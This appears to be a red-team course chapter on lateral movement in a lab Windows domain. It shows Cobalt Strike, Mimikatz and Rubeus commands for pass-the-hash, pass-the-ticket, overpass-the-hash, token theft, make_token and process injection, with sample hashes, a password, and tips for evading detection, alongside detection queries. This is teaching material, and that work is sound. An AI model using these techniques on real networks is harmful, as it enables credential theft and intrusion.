We know from our domain recon that jking is a local administrator on multiple computers via his membership of the Support Engineers domain group.  We also have credential material for this user in the form of an NTLM hash, AES256 hash and a Kerberos TGT.

This chapter will demonstrate different techniques in which we can leverage these credentials and use them to access one of the target computers.  There are also several techniques where we don't need credential material directly, but that take advantage of processes that the user is running on a machine we have elevated access on.
A common way of testing access to a machine is to list the C drive, as this requires local admin privileges to access.

# Pass The Hash 

Pass the hash is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password.  It works by starting a new logon session with a fake identity and then replacing the session information with the domain, username and NTLM hash provided.

Beacon has a dedicated pth command which executes Mimikatz in the background.
  This command requires elevated privileges.


First, attempt to list the C$ share of the WEB machine - this will fail because bfarmer is not a local admin there.

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

Then run the pth command with jking's username and NTLM hash.

    beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
    beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
    user	: jking
    domain	: DEV 
    program	: C:\Windows\system32\cmd.exe /c echo 71fb38e2d65 > \\.\pipe\675b08
    impers.	: no
    NTLM	: 59fc0f884922b4ce376051134c71e22c
    |  PID  1932
    |  TID  6600
    |  LSA Process is now R/W
    |  LUID 0 ; 7479840 (00000000:00722220)
    \_ msv1_0   - data copy @ 000001F6344B3D20 : OK !
    \_ kerberos - data copy @ 000001F6345BD7C8
    \_ aes256_hmac       -> null             
    \_ aes128_hmac       -> null             
    \_ rc4_hmac_nt       OK
    \_ rc4_hmac_old      OK
    \_ rc4_md4           OK
    \_ rc4_hmac_nt_exp   OK
    \_ rc4_hmac_old_exp  OK
    \_ *Password replace @ 000001F6344C6128 (32) -> null

We can see that the command Mimiktaz runs passes the new credentials over a named pipe, which Beacon then impersonates automatically.  We can then attempt to list the C$ share again, which will succeed.

    beacon> ls \\web.dev.cyberbotic.io\c$
    [*] Listing: \\web.dev.cyberbotic.io\c$\
    
    Size     Type    Last Modified         Name


To "drop" impersonation afterwards, use the rev2self command.

    beacon> rev2self
    [*] Tasked beacon to revert token
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

- Two opportunities to detect PTH are the R/W handle to LSASS; and looking for the echo foo > \\.\pipe\bar pattern in command-line logs.
- The former is already part of the "Suspicious Handle to LSASS" saved search.  This time we see an access mask of 0x1038.  This is a combination of PROCESS_QUERY_LIMITED_INFORMATION (0x1000), PROCESS_VM_WRITE (0x0020), PROCESS_VM_READ (0x0010) and PROCESS_VM_OPERATION (0x0008).

- The latter can be found via the "Suspicious Named Pipe Impersonation" search, which queries process events where the arguments contain "echo", ">" and "\\.\pipe\".


# Pass The Ticket 

Pass the ticket is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create.  Accessing a remote resource will then allow that authentication to happen via Kerberos.

For this, we can leverage the TGT we extracted from jking's logon session on Workstation 2.

The first step is to create a blank, "sacrificial" logon session that we can pass the TGT into.  We do this because a logon session can only hold a single TGT at a time.  If we passed jking's TGT into the LUID for bfarmer, it would erase bfarmer's TGT and cause all sorts of authentication issues for the user.

- Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges.

Rubeus' createnetonly command will start a new hidden process of our choosing, using the CreateProcessWithLogonW API.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

This also creates a new LUID.  It will have no tickets inside, so won't be visible with triage just yet.  The next step is to pass the TGT into this new LUID using the Rubeus ptt command.  Where the /luid is the new LUID we just created and /ticket is the base64 encoded ticket we previously extracted.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

Rubeus triage will now show jking's TGT inside this LUID.

    | 0x798c2c | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |

The final step is to impersonate the process that we created with createnetonly using Cobalt Strike's steal_token command.  At a minimum, this requires the PID of the target process, which in this example, is 4748.  We'll then be able to access the remote machine.

    beacon> steal_token 4748
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [*] Listing: \\web.dev.cyberbotic.io\c$\

As before, use rev2self to drop the impersonation.  To destroy the logon session we created, simply kill the process with the kill command.

    beacon> rev2self
    beacon> kill 4748

Rubeus triage will no longer show the logon session.

- By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The "Suspicious Logon Events" saved search will show 4624's where the TargetOutboundDomainName is not an expected value.

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Overpass The Hash

Overpass the hash is a technique which allows us to request a Kerberos TGT for a user, using their NTLM or AES hash.  Elevated privileges are required to obtain user hashes, but not to actually request a ticket.

Rubeus asktgt has us covered for this task.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

This TGT can then be leveraged via Pass the Ticket.

- Using an NTLM hash results in a ticket encrypted using RC4 (0x17).  This is considered a legacy encryption type and therefore often stands out as anomalous in a modern Windows environment.  The "RC4 TGTs" saved search will show all 4768 events where the ticket encryption type is 0x17.  It's very likely that the only result there will be the one generated from the above command.

To obtain a TGT encrypted using AES256 (0x12), you guessed it, use the user's AES256 hash instead.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap

You can find the corresponding 4768 event with this query:

    event.code: 4768 and winlog.event_data.TicketEncryptionType: 0x12 and winlog.event_data.TargetUserName: jking

It will be practically undistinguishable from the other TGT requests, with the exception of two fields:

1. The Supplied Realm Name will be dev.cyberbotic.io, instead of DEV.
2. The Ticket Options will be 0x40800010 instead of 0x40810010.


The asktgt command has two optional parameters that we can use to blend in a bit more.

If no /domain is specified, Rubeus uses the FQDN of the domain this computer is in.  Instead, we can force it to use the NetBIOS name with /domain:DEV.  There is also an /opsec flag which tells Rubeus to request the TGT in such a way that results in the Ticket Options being 0x40810010.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap

- Mimikatz can also perform overpass the hash, but in a way that writes into LSASS.  Rubeus' method doesn't touch LSASS but it does generate Kerberos traffic from an anomalous process, as this usually only occurs from LSASS.  These can be seen using the "Kerberos Traffic from Suspicious Process" saved search. The bottom line is that you have to "pick your poison".

# Token Impersonation

We have already seen an example of using Cobalt Strike's steal_token command in the context of pass the ticket.  However, if we elevate or land on a system where a user is running a process, we can impersonate its token without having to jump through additional hoops.

If we list the running processes on Workstation 2 from an elevated prompt, we see that jking is running an instance of mmc.exe.

 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking

 
We can simply steal its token and access a target.

    beacon> steal_token 5536
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [*] Listing: \\web.dev.cyberbotic.io\c$\


This technique works by obtaining a handle to the target process, opening and duplicating its primary access token, and then impersonating that token.  The downside is that if the user closes the process, our ability to abuse it goes away.  By taking the additional steps of extracting tickets or hashes, we provide ourselves a more guaranteed or "future-proof" way of leveraging the credential material.

When impersonating users in this way, the CS client (since 4.8) updates several UI elements to help you keep track of who (if anybody) you're Beacon is currently impersonating.

# Token Store 



Cobalt Strike 4.8 introduced a new set of commands called token-store.  This is an evolution on the steal_token command which allows you to steal and store tokens for future use.  For example, steal a token and add it to the token store with token-store steal <pid>.

    beacon> token-store steal 5536
    [*] Stored Tokens
    
    ID   PID   User
    --   ---   ----
    0    5536  DEV\jking

You may list all the tokens in the store with token-store show and impersonate one using token-store use <id>.

    beacon> token-store use 0
    [+] Impersonated DEV\jking

The rev2self command will drop the impersonation token, but it will remain in the store so that it can be impersonated again.  A token can be removed from the store using token-store remove <id> or the entire store flushed with token-store remove-all.

The primary advantages of the token store are two-fold.  The first is that we don't have to carry out the stealing process multiple times, which is better OPSEC.  Since stealing a token requires opening a handle to the target process and process token, the fewer times you do that, the better.  The second is that maintaining an open handle to the duplicated token prevents Windows from disposing of the user's logon session if they were to logoff or terminate the process we stole from.

It's important to note that each Beacon has its own token store.  You cannot transfer tokens from one Beacon to another, even if they're on the same host.

# Make Token 

The make_token command allows you to impersonate a user if you know their plaintext password.  This works under the hood by calling the LogonUserA API, which takes several parameters including a username, password, domain name and logon type.  In this instance, the LOGON32_LOGON_NEW_CREDENTIALS logon type is used, which allows the caller to clone its current token and specify new credentials for outbound network connections.

The API outputs a handle to a token which can then be passed to the ImpersonateLoggedOnUser API.  This allows the calling thread to impersonate the context of token (i.e. the impersonated user's context).

    beacon> make_token DEV\jking Qwerty123
    [+] Impersonated DEV\jking (netonly)

The logon session created with LogonUserA has the same local identifier as the caller but the alternate credentials are used when accessing a remote resource.

    beacon> remote-exec winrm web.dev.cyberbotic.io whoami
    dev\jking

This also means that make_token is not applicable to anything you may want to run on the current machine.  For that, spawnas may be a better solution. These logon events can be found in Kibana with the following query:

    event.code: 4624 AND winlog.event_data.LogonType: 9

Where 4624 is the "An account was successfully logged on" Event ID and LogonType 9 is LOGON32_LOGON_NEW_CREDENTIALS.  The events will show who the caller was, what user they impersonated, the calling process name, ID, and more.

- One unfortunate downside to detecting this technique is that runas /netonly behaves in the same way.  So it may be difficult to distinguish legitimate and malicious events.

# Process Injection

Process injection allows us to inject arbitrary shellcode into a process of our choosing.  You can only inject into processes that you can obtain a handle to with enough privileges to write into its memory.  In a non-elevated context, which usually limits you to your own processes.  In an elevated context, this includes processes owned by other users.

Beacon has two main injection commands - shinject and inject.  shinject allows you to inject any arbitrary shellcode from a binary file on your attacking machine; and inject will inject a full Beacon payload for the specified listener.

If we wanted to inject a TCP Beacon payload into the MMC process mentioned in the previous module, we could do:

    beacon> inject 4464 x64 tcp-local
    [*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 4464 (x64)
    [+] established link to child beacon: 10.10.123.102

Where:

  4464 is the target PID.
  x64 is the architecture of the process.
  tcp-local is the listener name.


The command will also automatically attempt to connect to the child if a P2P listener is used.  The resulting Beacon will run with the full privilege of the user who owns the process. The same caveats also apply - if the user closes this process, the Beacon will be lost.  The shellcode that's injected uses the Exit Thread function, so it won't kill the process if we exit the Beacon.
